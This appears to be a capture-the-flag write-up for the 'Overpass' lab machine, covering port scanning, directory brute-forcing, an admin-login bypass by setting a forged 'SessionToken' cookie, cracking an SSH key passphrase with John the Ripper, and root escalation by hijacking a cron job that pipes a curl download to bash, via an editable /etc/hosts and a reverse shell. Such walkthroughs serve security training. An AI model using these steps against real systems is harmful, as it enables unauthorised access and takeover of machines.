TOOLS USED:

NMAP
GOBUSTER
SSH JHON 
LINPEAS


THE MACHINE IS OVERPASS


For firts thing we run the tool name Nmap: 

	nmap -p- IPMACHINE

we foud two ports open wich there are:

	ssh 22

	http 80


we enter on the website and run the gobaster 

	└─$ gobuster dir -u http://IP:PORT -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt


found /admin and let's get into it
in the source there is a file login.js 
we found where it generate a cookie name 'SessionToken'
generate a random cookie called 'SessionToken' and refresh the page 
inside of there is key rsa for access on ssh and the username 'james'
for the key you need a anther key that we will brutforce using the tool jhon


whit  ss2jhon.py generate the hash of the key access 
	
	ss2jhon.py id_rsa > id_rsa.jon 

now whit jhon and the wordlist rockyou.txt bruteforce 

	john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.john

the password is james13
now enter on the ssh 

	ssh -i rsakey james@IP  

insert the pasphrase for key 'rsakey'

	james13

you are in the machine whit james user's 
now there is the first flag in user.txt



Now the need  do escalate our privilage.For do that , we use another tool called linepas.
run this on the machine for extract the information for possible privialge escalation. 


The vuln is on file in the cromtab 

	root curl overpass.thm/downloads/src/buildscript.sh | bash

and thew file ect/hosts is editable by user

we edit the hosts and insert your ip machine instead of the overpass.thm for send a reverse shell 

in our terminal create the file buildscript.sh whit path and insert the reverse shell 

open a client for the reverse and server to send this buildscript

now reverse shell worked

we are root and there is the last flag in root.txt









	


 

